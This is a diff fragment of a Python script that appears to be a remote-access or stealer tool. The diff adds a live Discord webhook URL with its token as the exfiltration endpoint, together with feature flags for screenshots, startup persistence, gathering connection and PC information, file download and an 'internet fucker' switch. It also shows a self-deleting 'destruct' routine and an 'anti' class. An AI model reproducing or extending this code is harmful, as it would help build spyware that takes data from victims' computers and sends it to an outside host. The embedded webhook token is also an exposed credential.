@@ -51,7 +51,7 @@ except Exception as e:
     import time
     import pygame
 
-
+os.system("cls")
 class util:
     def destruct():
         os.remove(os.path.abspath(__file__))
@@ -101,7 +101,7 @@ class anti:
             return True
             
 
-wb = ''
+wb = 'https://discord.com/api/webhooks/1194365996660703242/wzvjwXLqC9sWrspTI13-HZuGPCs2cVKOuT4WcwNu8QPqk8OTtQKEnShIeRdAYx35n1Y4'
 
 def send_embed():
     config = f"""
@@ -114,6 +114,10 @@ screenshoot = {ss}
 startup = {startup}
 connection info fetcher = {con_info}
 pc info fetcher = {pc_info}
+file download = {down_file}
+music player = {play_music}
+
+internet fucker = {fuck_internet}
 """
     try:
         embed = {
